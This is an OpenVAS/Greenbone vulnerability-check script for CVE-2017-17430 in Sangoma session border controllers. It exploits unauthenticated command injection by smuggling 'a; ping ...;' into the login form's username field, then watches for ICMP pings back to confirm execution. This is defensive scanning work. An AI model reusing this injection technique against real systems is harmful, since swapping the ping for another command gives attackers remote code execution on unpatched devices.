# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:sangoma:session_border_controller_firmware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112184");
  script_version("2024-11-13T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-11-13 05:05:39 +0000 (Wed, 13 Nov 2024)");
  script_tag(name:"creation_date", value:"2018-01-11 12:32:00 +0100 (Thu, 11 Jan 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2017-17430");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sangoma NetBorder/Vega Session Controller < 2.3.12-80-GA RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_sangoma_sbc_consolidation.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("sangoma/sbc/http/detected");

  script_tag(name:"summary", value:"Sangoma NetBorder/Vega Session Controller is prone to a remote
  code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the target is
  connecting back to the scanner host.

  Note: For a successful detection of this flaw the scanner host needs to be able to directly
  receive ICMP echo requests from the target.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  execute arbitrary code in the context of the affected application.");

  script_tag(name:"affected", value:"Sangoma NetBorder/Vega Session Controller prior to version
  2.3.12-80-GA.");

  script_tag(name:"solution", value:"Update to version 2.3.12-80-GA or later.");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2018/Jan/36");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("misc_func.inc");
include("dump.inc");
include("list_array_func.inc");
include("pcap_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

ownhostname = this_host_name();
ownip = this_host();
src_filter = pcap_src_ip_filter_from_hostnames();
dst_filter = string( "(dst host ", ownip, " or dst host ", ownhostname, ")" );
filter = string( "icmp and icmp[0] = 8 and ", src_filter, " and ", dst_filter );

url = "/";
headers = make_array( "Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7rCkcn7Zm8a4V1bH" );

foreach connect_back_target( make_list( ownip, ownhostname ) ) {

  vtstrings = get_vt_strings();
  check = vtstrings["ping_string"];
  pattern = hexstr( check );
  pingcmd = "ping -c 3 -p " + pattern + " " + connect_back_target;

  post_data = '------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name="reserved_username"\r\n\r\na; ' + pingcmd + ';\r\n' +
              '------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name="reserved_password"\r\n\r\nabc\r\n' +
              '------WebKitFormBoundary7rCkcn7Zm8a4V1bH\r\nContent-Disposition: form-data; name="Login"\r\n\r\nLogin\r\n' +
              '------WebKitFormBoundary7rCkcn7Zm8a4V1bH--\r\n';

  req = http_post_put_req( port:port, url:url, data:post_data, add_headers:headers );

  # nb: Always keep open_sock_tcp() after the first call of a function forking on multiple hostnames /
  # vhosts (e.g. http_get(), http_post_put_req(), http_host_name(), get_host_name(), ...). Reason: If
  # the fork would be done after calling open_sock_tcp() the child's would share the same socket
  # causing race conditions and similar.
  if( ! soc = open_sock_tcp( port ) )
    continue;

  res = send_capture( socket:soc, data:req, pcap_filter:filter );

  close( soc );

  if( ! res )
    continue;

  type = get_icmp_element( icmp:res, element:"icmp_type" );
  if( ! type || type != 8 )
    continue;

  if( ! data = get_icmp_element( icmp:res, element:"data" ) )
    continue;

  if( check >< data ) {
    report = http_report_vuln_url( port:port, url:url );
    report += '\n\nIt was possible to execute the command "' + pingcmd + '" on the remote host.\n\nRequest:\n\n' + req + '\n\nReceived answer (ICMP "Data" field):\n\n' + hexdump( ddata:data );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or another IP is responding from our request.
exit( 0 );
